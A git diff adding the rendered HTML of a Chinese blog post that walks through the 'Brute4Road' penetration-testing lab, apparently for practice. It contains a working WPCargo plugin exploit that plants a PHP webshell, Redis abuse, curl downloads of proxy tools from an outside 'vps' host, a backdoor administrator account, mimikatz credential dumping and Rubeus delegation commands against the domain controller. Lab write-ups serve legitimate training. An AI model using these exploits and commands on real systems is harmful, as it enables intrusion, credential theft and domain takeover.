@@ -1,37 +1,418 @@
-{% extends '_layout.swig' %}
-{% import '_macro/post.swig' as post_template %}
-{% import '_macro/sidebar.swig' as sidebar_template %}
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 7.2.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/hackerone-32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/hackerone-16.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <meta name="msvalidate.01" content="237E6FD4C952815B9A0DDB67FAB1FF12">
+  <meta name="baidu-site-verification" content="code-LhZrqnckkC">
+
+<link rel="stylesheet" href="/css/main.css">
 
 
-{% block title %}{{ page.title }} | {{ config.title }}{% endblock %}
 
-{% block page_class %}page-post-detail{% endblock %}
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" integrity="sha256-wiz7ZSCn/btzhjKDQBms9Hx4sSeUYsDrTLg7roPstac=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"eur1ka.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.19.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="flag1fscan扫描发现，6379开放ftp可以匿名登录  这里直接尝试了去打redis但是只有主从复制能成功（这里应该是靶场有设置吧，对6379操作过后再次操作就会显示端口拒绝访问直接重置就可以了） 之后用脚本一把梭哈即可获得shell 12345678#更改交互方式python -c &#x27;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;);&amp;#x">
+<meta property="og:type" content="article">
+<meta property="og:title" content="春秋云镜 Brute4Road">
+<meta property="og:url" content="https://eur1ka.github.io/2023/08/28/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%20Brute4Road/index.html">
+<meta property="og:site_name" content="Eureka&#39;s Blog">
+<meta property="og:description" content="flag1fscan扫描发现，6379开放ftp可以匿名登录  这里直接尝试了去打redis但是只有主从复制能成功（这里应该是靶场有设置吧，对6379操作过后再次操作就会显示端口拒绝访问直接重置就可以了） 之后用脚本一把梭哈即可获得shell 12345678#更改交互方式python -c &#x27;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;);&amp;#x">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202308281715828.png">
+<meta property="og:image" content="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202308281715849.png">
+<meta property="og:image" content="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202308281715859.png">
+<meta property="og:image" content="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202308281715874.png">
+<meta property="og:image" content="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202308281715892.png">
+<meta property="og:image" content="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202308281715904.png">
+<meta property="og:image" content="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202308281715873.png">
+<meta property="og:image" content="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202308281715882.png">
+<meta property="og:image" content="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202308281715891.png">
+<meta property="og:image" content="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202308281715903.png">
+<meta property="og:image" content="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202308281715915.png">
+<meta property="og:image" content="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202308281715934.png">
+<meta property="og:image" content="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202308281719461.png">
+<meta property="og:image" content="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202308281715092.png">
+<meta property="article:published_time" content="2023-08-28T09:20:00.000Z">
+<meta property="article:modified_time" content="2023-08-28T09:20:38.984Z">
+<meta property="article:author" content="nnnpc、commit、Eureka">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202308281715828.png">
 
 
-{% block content %}
+<link rel="canonical" href="https://eur1ka.github.io/2023/08/28/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%20Brute4Road/">
 
-  <div id="posts" class="posts-expand">
-    {{ post_template.render(page) }}
 
-    <div class="post-spread">
-      {% if theme.jiathis %}
-        {% include '_partials/share/jiathis.swig' %}
-      {% elseif theme.baidushare %}
-        {% include '_partials/share/baidushare.swig' %}
-      {% elseif theme.add_this_id %}
-        {% include '_partials/share/add-this.swig' %}
-      {% elseif theme.duoshuo_shortname and theme.duoshuo_share %}
-        {% include '_partials/share/duoshuo_share.swig' %}
-      {% endif %}
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://eur1ka.github.io/2023/08/28/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%20Brute4Road/","path":"2023/08/28/春秋云镜 Brute4Road/","title":"春秋云镜 Brute4Road"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>春秋云镜 Brute4Road | Eureka's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
     </div>
   </div>
 
-{% endblock %}
+  <div class="site-meta">
 
-{% block sidebar %}
-  {{ sidebar_template.render(true) }}
-{% endblock %}
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Eureka's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">默安科技逐日实验室</p>
+  </div>
 
-{% block script_extra %}
-  {% include '_scripts/pages/post-details.swig' %}
-{% endblock %}
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#flag1"><span class="nav-number">1.</span> <span class="nav-text">flag1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#flag2"><span class="nav-number">2.</span> <span class="nav-text">flag2</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#flag3"><span class="nav-number">3.</span> <span class="nav-text">flag3</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#flag4"><span class="nav-number">4.</span> <span class="nav-text">flag4</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">5.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="nav-number">6.</span> <span class="nav-text">参考文章</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="nnnpc、commit、Eureka"
+      src="/images/head.png">
+  <p class="site-author-name" itemprop="name">nnnpc、commit、Eureka</p>
+  <div class="site-description" itemprop="description">网络信息安全，责任重大，使命光荣。</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="mailto:1695672857@qq.com" title="E-Mail → mailto:1695672857@qq.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://eur1ka.github.io/2023/08/28/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%20Brute4Road/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/head.png">
+      <meta itemprop="name" content="nnnpc、commit、Eureka">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Eureka's Blog">
+      <meta itemprop="description" content="网络信息安全，责任重大，使命光荣。">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="春秋云镜 Brute4Road | Eureka's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          春秋云镜 Brute4Road
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2023-08-28 17:20:00 / 修改时间：17:20:38" itemprop="dateCreated datePublished" datetime="2023-08-28T17:20:00+08:00">2023-08-28</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">笔记</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E7%AC%94%E8%AE%B0/web%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">web笔记</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h4 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h4><p>fscan扫描发现，6379开放ftp可以匿名登录</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202308281715828.png" alt="image-20230825092314642"></p>
+<p>这里直接尝试了去打redis但是只有主从复制能成功（这里应该是靶场有设置吧，对6379操作过后再次操作就会显示端口拒绝访问直接重置就可以了）</p>
+<p>之后用脚本一把梭哈即可获得shell</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">更改交互方式</span></span><br><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;);&#x27;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查找特权位</span></span><br><span class="line">sudo -l</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">suid查找</span></span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">提权获取flag</span></span><br><span class="line">base64 &quot;/home/redis/flag/flag01&quot;|base64 --decode</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202308281715849.png" alt="image-20230825092737360"></p>
+<h4 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h4><p>靶机上ifconfig,ip addr,arp -a都不存在最后使用<code>hostname -l</code>获取所在网段；</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202308281715859.png" alt="image-20230828170633084"></p>
+<p>上传代理工具</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl http://vps/frpc --output frpc</span><br><span class="line">curl http://vps/frpc.ini --output frpc.ini</span><br></pre></td></tr></table></figure>
+
+<p><strong>tips:socks只能代理tcp的流量，ping走的是icmp，所以我们就算使用代理也是不能给ping使用的。</strong></p>
+<p>接着使用fscan探测c段</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">./fscan -h 172.22.2.1/24</span><br><span class="line">   ___                              _    </span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __ </span><br><span class="line"> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /</span><br><span class="line">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    </span><br><span class="line">\____/     |___/\___|_|  \__,_|\___|_|\_\   </span><br><span class="line">                     fscan version: 1.8.1</span><br><span class="line">start infoscan</span><br><span class="line">已完成 0/0 listen ip4:icmp 0.0.0.0: socket: operation not permitted</span><br><span class="line">trying RunIcmp2</span><br><span class="line">The current user permissions unable to send icmp packets</span><br><span class="line">start ping</span><br><span class="line">(icmp) Target 172.22.2.3      is alive</span><br><span class="line">(icmp) Target 172.22.2.7      is alive</span><br><span class="line">(icmp) Target 172.22.2.16     is alive</span><br><span class="line">(icmp) Target 172.22.2.18     is alive</span><br><span class="line">(icmp) Target 172.22.2.34     is alive</span><br><span class="line">[*] Icmp alive hosts len is: 5</span><br><span class="line">172.22.2.16:80 open</span><br><span class="line">172.22.2.18:80 open</span><br><span class="line">172.22.2.18:22 open</span><br><span class="line">172.22.2.7:80 open</span><br><span class="line">172.22.2.7:22 open</span><br><span class="line">172.22.2.7:21 open</span><br><span class="line">172.22.2.16:1433 open</span><br><span class="line">172.22.2.34:445 open</span><br><span class="line">172.22.2.18:445 open</span><br><span class="line">172.22.2.16:445 open</span><br><span class="line">172.22.2.3:445 open</span><br><span class="line">172.22.2.34:139 open</span><br><span class="line">172.22.2.34:135 open</span><br><span class="line">172.22.2.16:139 open</span><br><span class="line">172.22.2.18:139 open</span><br><span class="line">172.22.2.3:139 open</span><br><span class="line">172.22.2.16:135 open</span><br><span class="line">172.22.2.3:135 open</span><br><span class="line">172.22.2.7:6379 open</span><br><span class="line">172.22.2.3:88 open</span><br><span class="line">[*] alive ports len is: 20</span><br><span class="line">start vulscan</span><br><span class="line">[+] NetInfo:</span><br><span class="line">[*]172.22.2.16</span><br><span class="line">   [-&gt;]MSSQLSERVER</span><br><span class="line">   [-&gt;]172.22.2.16</span><br><span class="line">[*] 172.22.2.34          XIAORANG\CLIENT01          </span><br><span class="line">[+] NetInfo:</span><br><span class="line">[*]172.22.2.3</span><br><span class="line">   [-&gt;]DC</span><br><span class="line">   [-&gt;]172.22.2.3</span><br><span class="line">[*] 172.22.2.3     [+]DC XIAORANG\DC                Windows Server 2016 Datacenter 14393</span><br><span class="line">[*] 172.22.2.3  (Windows Server 2016 Datacenter 14393)</span><br><span class="line">[*] 172.22.2.16  (Windows Server 2016 Datacenter 14393)</span><br><span class="line">[+] NetInfo:</span><br><span class="line">[*]172.22.2.34</span><br><span class="line">   [-&gt;]CLIENT01</span><br><span class="line">   [-&gt;]172.22.2.34</span><br><span class="line">[*] WebTitle:http://172.22.2.7         code:200 len:4833   title:Welcome to CentOS</span><br><span class="line">[*] WebTitle:http://172.22.2.16        code:404 len:315    title:Not Found</span><br><span class="line">[*] 172.22.2.18          WORKGROUP\UBUNTU-WEB02      </span><br><span class="line">[*] 172.22.2.16          XIAORANG\MSSQLSERVER       Windows Server 2016 Datacenter 14393</span><br><span class="line">[+] ftp://172.22.2.7:21:anonymous </span><br><span class="line">   [-&gt;]pub</span><br><span class="line">[*] WebTitle:http://172.22.2.18        code:200 len:57738  title:又一个WordPress站点</span><br><span class="line">已完成 19/20 [-] redis 172.22.2.7:6379 redis123 &lt;nil&gt;</span><br><span class="line">已完成 19/20 [-] redis 172.22.2.7:6379 123456!a &lt;nil&gt;</span><br><span class="line">已完成 19/20 [-] redis 172.22.2.7:6379 1qaz!QAZ &lt;nil&gt;</span><br><span class="line">已完成 20/20</span><br></pre></td></tr></table></figure>
+
+<p>根据fscan扫描结果进行总结</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(icmp) Target 172.22.2.3      is alive  DC</span><br><span class="line">(icmp) Target 172.22.2.7      is alive  出网机</span><br><span class="line">(icmp) Target 172.22.2.16     is alive  mssqlserver</span><br><span class="line">(icmp) Target 172.22.2.18     is alive  wpscan站点</span><br></pre></td></tr></table></figure>
+
+<p>先从wordpress进行入手，wpscan扫描进行信息搜集</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202308281715874.png" alt="image-20230827153154969"></p>
+<p>这个插件存在漏洞</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment"># This is a magic string that when treated as pixels and compressed using the png</span></span><br><span class="line"><span class="comment"># algorithm, will cause &lt;?=$_GET[1]($_POST[2]);?&gt; to be written to the png file</span></span><br><span class="line">payload = <span class="string">&#x27;2f49cf97546f2c24152b216712546f112e29152b1967226b6f5f50&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode_character_code</span>(<span class="params">c: <span class="built_in">int</span></span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#123;:08b&#125;&#x27;</span>.<span class="built_in">format</span>(c).replace(<span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">text = <span class="string">&#x27;&#x27;</span>.join([encode_character_code(c) <span class="keyword">for</span> c <span class="keyword">in</span> binascii.unhexlify(payload)])[<span class="number">1</span>:]</span><br><span class="line">destination_url = <span class="string">&#x27;http://172.22.2.18/&#x27;</span></span><br><span class="line">cmd = <span class="string">&#x27;ls&#x27;</span></span><br><span class="line"><span class="comment"># With 1/11 scale, &#x27;1&#x27;s will be encoded as single white pixels, &#x27;x&#x27;s as single black pixels.</span></span><br><span class="line">requests.get(</span><br><span class="line">    <span class="string">f&quot;<span class="subst">&#123;destination_url&#125;</span>wp-content/plugins/wpcargo/includes/barcode.php?text=<span class="subst">&#123;text&#125;</span>&amp;sizefactor=.090909090909&amp;size=1&amp;filepath=/var/www/html/webshell.php&quot;</span></span><br><span class="line">)</span><br><span class="line"><span class="comment"># We have uploaded a webshell - now let&#x27;s use it to execute a command.</span></span><br><span class="line"><span class="built_in">print</span>(requests.post(</span><br><span class="line">    <span class="string">f&quot;<span class="subst">&#123;destination_url&#125;</span>webshell.php?1=system&quot;</span>, data=&#123;<span class="string">&quot;2&quot;</span>: cmd&#125;</span><br><span class="line">).content.decode(<span class="string">&#x27;ascii&#x27;</span>, <span class="string">&#x27;ignore&#x27;</span>))</span><br></pre></td></tr></table></figure>
+
+<p>执行脚本将木马植入，因为写入的木马是system，所以调换蚁剑连接模式</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202308281715892.png" alt="image-20230827154020334"></p>
+<p>之后找到wordpress配置文件，找到数据库密码，进行连接（这里也可以再本地使用navicate进行连接，思路并不是唯一的，习惯熟练才是最重要的）</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202308281715904.png" alt="image-20230827154253001"></p>
+<p>获得第二个flag</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202308281715873.png" alt="image-20230827154314333"></p>
+<h4 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h4><p>我们在数据库中发现另一些提示是一个存储密码的表，猜测应该存在<code>(icmp) Target 172.22.2.16 is alive  mssqlserver</code>的密码；我们用hyder进行爆破</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202308281715882.png" alt="image-20230827154730841"></p>
+<p>获取密码，然后利用工具进行连接，根据前期的收集这是一台windos主机，进行简单的信息收集</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202308281715891.png" alt="image-20230827155047357"></p>
+<p>我们发现3389开放，尝试提权写入用户进行远程连接</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202308281715903.png" alt="image-20230827154941259"></p>
+<p>提权成功，写入用户</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">添加用户hack 密码admin!@<span class="comment">#45</span></span></span><br><span class="line">net user hack admin!@#45 /add</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">加入管理员组</span></span><br><span class="line">net localgroup administrators hack /add</span><br></pre></td></tr></table></figure>
+
+<p>之后再<code>C:\USERS\ADMINISTRATOR\FLAG</code>中获得第三个flag</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202308281715915.png" alt="image-20230827155328410"></p>
+<h4 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h4><p>再次进行信息收集（<strong>tips:值得注意的是我们现在并不在域内，因为我们登录的用户并不是域成员</strong>），但不影响我们寻找域控，通过报错信息or前期fscan扫描结果我们都可以轻松判断出域控主机是<code>172.22.2.3</code>;</p>
+<p>mimikate抓取内存</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">提权</span></span><br><span class="line">privilege::debug</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">抓密码</span></span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202308281715934.png" alt="image-20230828160039651"></p>
+<p>找到服务账户尝试进行约束委派攻击（我们也可以通过setspn的方式进行判断）</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">申请票据</span></span><br><span class="line">.\Rubeus.exe asktgt /user:MSSQLSERVER$ /rc4:抓到的NTML /domain:xiaorang.l ab /dc:DC.xiaorang.lab /nowrap</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">注入票据</span></span><br><span class="line">.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:CIFS/DC.xiaorang.lab /dc:DC.xiaorang.l</span><br><span class="line">ab /ptt /ticket:上面生成的结果</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202308281719461.png" alt="image-20230828171936364"></p>
+<p>注入成功这时候我们能成功访问域控主机，读取flag</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type \\DC.xiaorang.lab\C$\Users\Administrator\flag\flag04.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202308281715092.png" alt="image-20230828160056545"></p>
+<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><ul>
+<li>对工具模块利用不熟悉</li>
+<li>，信息收集不完善不到位，横向时的方法选择思路不清晰</li>
+</ul>
+<h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/581577873">【仿真场景】Brute4Road - 知乎 (zhihu.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45746286/article/details/128775222">靶场练习–春秋云境-Brute4Road_NooEmotion的博客-CSDN博客</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/web/" rel="tag"><i class="fa fa-tag"></i> web</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2023/08/23/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%20Initial/" rel="prev" title="春秋云镜 Initial">
+                  <i class="fa fa-angle-left"></i> 春秋云镜 Initial
+                </a>
